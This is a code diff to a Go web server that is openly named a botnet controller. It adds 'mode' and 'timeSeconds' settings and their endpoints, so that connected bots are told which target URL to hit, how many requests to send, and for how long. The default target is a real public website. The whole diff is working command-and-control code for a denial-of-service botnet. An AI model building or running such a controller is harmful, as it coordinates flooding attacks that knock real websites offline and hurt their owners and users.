@@ -27,8 +27,10 @@ type BotStatsReqBody struct {
 }
 
 type TargetInfo struct {
-	TargetUrl  string
-	RequestNum int
+	TargetUrl   string
+	RequestNum  int
+	Mode        string
+	TimeSeconds int
 }
 
 type ServerStatusReqBody struct {
@@ -43,7 +45,15 @@ type SetRequestsNumberReqBody struct {
 	RequestsNumber int `json:"requestsNumber"`
 }
 
-var targetInfo = TargetInfo{"https://theuselessweb.com/", 10}
+type SetModeReqBody struct {
+	Mode string `json:"mode"`
+}
+
+type SetTimeSecondsReqBody struct {
+	TimeSeconds int `json:"timeSeconds"`
+}
+
+var targetInfo = TargetInfo{"https://theuselessweb.com/", 10, "timeMode", 1}
 var botnetServer = BotnetServer{true, make(map[string]time.Time), []BotStats{}}
 var PORT = 5000
 
@@ -70,9 +80,11 @@ func GetTargetInfo(c *gin.Context) {
 	botnetServer.ConnectedBots[c.ClientIP()] = time.Now()
 
 	c.JSON(200, gin.H{
-		"status":     botnetServer.Status,
-		"targetUrl":  targetInfo.TargetUrl,
-		"requestNum": targetInfo.RequestNum,
+		"status":      botnetServer.Status,
+		"targetUrl":   targetInfo.TargetUrl,
+		"requestNum":  targetInfo.RequestNum,
+		"mode":        targetInfo.Mode,
+		"timeSeconds": targetInfo.TimeSeconds,
 	})
 }
 
@@ -161,6 +173,52 @@ func SetRequestsNumber(c *gin.Context) {
 	}
 }
 
+func SetTimeSeconds(c *gin.Context) {
+	var setTimeSecondsReqBody SetTimeSecondsReqBody
+	err := c.ShouldBindJSON(&setTimeSecondsReqBody)
+
+	if err == nil {
+		targetInfo.TimeSeconds = setTimeSecondsReqBody.TimeSeconds
+
+		c.JSON(200, gin.H{
+			"message": "TimeSeconds has been set to " + strconv.Itoa(setTimeSecondsReqBody.TimeSeconds),
+		})
+		return
+	} else {
+		c.JSON(500, gin.H{
+			"messsage": "Oops, error while setting timeSeconds",
+		})
+		return
+	}
+}
+
+func SetMode(c *gin.Context) {
+	var setModeReqBody SetModeReqBody
+	err := c.ShouldBindJSON(&setModeReqBody)
+
+	if err == nil {
+		if setModeReqBody.Mode == "requestMode" || setModeReqBody.Mode == "timeMode" {
+			targetInfo.Mode = setModeReqBody.Mode
+
+			c.JSON(200, gin.H{
+				"message": "Mode has been set to " + setModeReqBody.Mode,
+			})
+			return
+		}
+
+		c.JSON(404, gin.H{
+			"message": "Invalid mode value",
+		})
+		return
+
+	} else {
+		c.JSON(500, gin.H{
+			"messsage": "Oops, error while setting mode",
+		})
+		return
+	}
+}
+
 func main() {
 	server := gin.Default()
 	server.Use(cors.Default())
@@ -173,6 +231,8 @@ func main() {
 	server.POST("/setServerStatus", SetServerStatus)
 	server.POST("/changeTarget", ChangeTarget)
 	server.POST("/setRequestsNumber", SetRequestsNumber)
+	server.POST("/setMode", SetMode)
+	server.POST("/setTimeSeconds", SetTimeSeconds)
 
 	server.Run(":" + strconv.Itoa(PORT))
 }
